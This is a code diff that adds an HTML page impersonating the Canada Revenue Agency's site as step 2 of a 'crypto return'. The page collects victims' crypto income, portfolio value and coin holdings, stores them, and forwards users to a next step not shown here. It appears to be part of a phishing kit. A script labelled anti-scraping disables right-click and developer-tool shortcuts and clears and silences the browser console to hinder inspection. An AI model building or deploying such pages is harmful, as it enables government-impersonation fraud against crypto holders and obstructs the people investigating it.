@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit crypto return - Step 2 - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Noto Sans', sans-serif; color: #333; }
+        .container-custom { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .nav-bar { background-color: #26374a; height: 50px; }
+        .nav-bar a { text-decoration: none; cursor: pointer; }
+        .nav-bar a:hover { background-color: #1a2633; }
+        .red-accent { border-bottom: 4px solid #af3c43; display: inline-block; margin-bottom: 20px; }
+        .search-container { display: flex; align-items: center; }
+        .search-input { border: 1px solid #ccc; padding: 6px 10px; width: 250px; }
+        .search-button { background-color: #26374a; color: white; padding: 6px 12px; border: 1px solid #26374a; }
+        input:focus, select:focus { outline: 2px solid #335075; outline-offset: 1px; }
+    </style>
+</head>
+<body class="bg-white">
+
+    <header class="py-6">
+        <div class="container-custom flex justify-between items-start">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-10">
+            <div class="hidden md:flex flex-col items-end">
+                <a href="declaration-fr.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">Français</a>
+                <div class="search-container">
+                    <input type="text" placeholder="Search CRA" class="search-input">
+                    <button class="search-button"><i class="fas fa-search"></i></button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+  <nav class="nav-bar"></nav>
+
+
+    <div class="bg-white py-3 border-b border-gray-100">
+        <div class="container-custom text-sm">
+            <nav class="flex items-center text-[#335075]">
+                <a href="#" class="hover:underline">Canada.ca</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="hover:underline">CRA</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <span>Submit crypto return</span>
+            </nav>
+        </div>
+    </div>
+
+    <main class="container-custom py-10">
+        <div class="red-accent">
+            <h1 class="text-4xl font-bold pb-2">Submit crypto return</h1>
+        </div>
+
+        <div class="mb-8">
+            <p class="text-xl font-bold text-[#333]">Step 2 of 4: Financial declaration</p>
+            <div class="w-full bg-gray-200 h-2 mt-4 max-w-md">
+                <div class="bg-[#335075] h-2 w-2/4"></div>
+            </div>
+        </div>
+
+        <form id="declarationForm" class="max-w-4xl space-y-8">
+            <section class="space-y-4">
+                <h2 class="text-2xl font-bold border-b pb-2">Income & Holdings</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div>
+                        <label class="block text-sm font-bold mb-2">Total Crypto Income (2025 CAD equivalent) <span class="text-red-700">*</span></label>
+                        <input id="totalIncome" type="number" class="w-full border-2 border-gray-300 rounded px-3 py-2" placeholder="0.00" required>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold mb-2">Total Current Portfolio Value (CAD) <span class="text-red-700">*</span></label>
+                        <input id="portfolioValue" type="number" class="w-full border-2 border-gray-300 rounded px-3 py-2" placeholder="0.00" required>
+                    </div>
+                </div>
+            </section>
+
+            <section class="space-y-4">
+                <h2 class="text-2xl font-bold border-b pb-2">Coins Held</h2>
+                <div id="coins-container" class="space-y-4">
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 items-end bg-gray-50 p-4 rounded coin-row">
+                        <div>
+                            <label class="block text-sm font-bold mb-2">Coin Name</label>
+                            <input type="text" class="coin-name w-full border border-gray-300 rounded px-3 py-2" placeholder="e.g. BTC, ETH">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-bold mb-2">Value in CAD</label>
+                            <input type="number" class="coin-value w-full border border-gray-300 rounded px-3 py-2" placeholder="0.00">
+                        </div>
+                        <div class="flex items-center h-10">
+                            <span class="text-sm text-gray-500 italic">Primary Holding</span>
+                        </div>
+                    <!-- hidden to mark first row -->
+                    </div>
+                </div>
+                <button type="button" id="add-coin" class="text-[#335075] font-bold hover:underline">
+                    <i class="fas fa-plus-circle"></i> Add another coin
+                </button>
+            </section>
+
+            <section class="space-y-4">
+                <h2 class="text-2xl font-bold border-b pb-2">Additional Tax Information</h2>
+                <div class="grid grid-cols-1 gap-6">
+                    <div>
+                        <label class="block text-sm font-bold mb-2">Did you engage in crypto mining or staking? <span class="text-red-700">*</span></label>
+                        <div class="flex gap-4">
+                            <label class="flex items-center"><input type="radio" name="mining" value="Yes" class="mr-2"> Yes</label>
+                            <label class="flex items-center"><input type="radio" name="mining" value="No" class="mr-2"> No</label>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold mb-2">Number of disposals/trades in this tax year <span class="text-red-700">*</span></label>
+                        <input id="numTrades" type="number" class="w-48 border-2 border-gray-300 rounded px-3 py-2" required>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold mb-2">Did you receive crypto as payment for goods or services? <span class="text-red-700">*</span></label>
+                        <div class="flex gap-4">
+                            <label class="flex items-center"><input type="radio" name="payment" value="Yes" class="mr-2"> Yes</label>
+                            <label class="flex items-center"><input type="radio" name="payment" value="No" class="mr-2"> No</label>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <div class="flex gap-4 pt-6">
+                <button type="submit" class="bg-[#335075] text-white px-8 py-2 rounded font-bold hover:bg-[#26374a]">Next</button>
+                <button type="button" onclick="window.location.href='register.html'" class="bg-gray-200 text-gray-700 px-8 py-2 rounded font-bold hover:bg-gray-300">Previous</button>
+            </div>
+        </form>
+
+        <div class="mt-20 border-t pt-10 text-gray-600 text-sm">
+            <p>Date modified: 2023-12-13</p>
+        </div>
+    </main>
+
+    <footer class="bg-[#26374a] text-white py-16 border-t-8 border-[#af3c43]">
+        <div class="container-custom">
+            <h2 class="text-2xl font-bold">Canada Revenue Agency (CRA)</h2>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('add-coin').addEventListener('click', () => {
+            const container = document.getElementById('coins-container');
+            const div = document.createElement('div');
+            div.className = 'grid grid-cols-1 md:grid-cols-3 gap-4 items-end bg-gray-50 p-4 rounded coin-row';
+            div.innerHTML = `
+                <div>
+                    <label class="block text-sm font-bold mb-2">Coin Name</label>
+                    <input type="text" class="coin-name w-full border border-gray-300 rounded px-3 py-2" placeholder="e.g. BTC, ETH">
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Value in CAD</label>
+                    <input type="number" class="coin-value w-full border border-gray-300 rounded px-3 py-2" placeholder="0.00">
+                </div>
+                <button type="button" class="text-red-700 font-bold hover:underline mb-2 flex items-center h-10" onclick="this.parentElement.remove()">
+                    <i class="fas fa-trash-alt mr-2"></i> Remove
+                </button>
+            `;
+            container.appendChild(div);
+        });
+
+        // Mark the initial coin row
+        document.querySelector('#coins-container > div').classList.add('coin-row');
+        document.querySelector('#coins-container .coin-row input:nth-child(1)') && (() => {
+            var rows = document.querySelectorAll('.coin-row');
+            rows[0].querySelectorAll('input')[0].classList.add('coin-name');
+            rows[0].querySelectorAll('input')[1].classList.add('coin-value');
+        })();
+
+        document.getElementById('declarationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var mining = document.querySelector('input[name="mining"]:checked');
+            var payment = document.querySelector('input[name="payment"]:checked');
+            var coins = [];
+            document.querySelectorAll('.coin-row').forEach(function(row) {
+                var nameEl  = row.querySelector('.coin-name');
+                var valueEl = row.querySelector('.coin-value');
+                if (nameEl && nameEl.value.trim()) {
+                    coins.push({ name: nameEl.value.trim(), value: valueEl ? valueEl.value : '' });
+                }
+            });
+            var data = {
+                totalIncome:    document.getElementById('totalIncome').value,
+                portfolioValue: document.getElementById('portfolioValue').value,
+                mining:         mining ? mining.value : 'Not answered',
+                numTrades:      document.getElementById('numTrades').value,
+                payment:        payment ? payment.value : 'Not answered',
+                coins:          coins
+            };
+            localStorage.setItem('cra_declaration', JSON.stringify(data));
+            window.location.href = 'certification.html';
+        });
+    </script>
+
+    <script>
+        // Anti-scraping protection
+        (function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                    (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console logs periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Disable console functions
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            console.debug = function() {};
+        })();
+    </script>
+
+</body>
+</html>
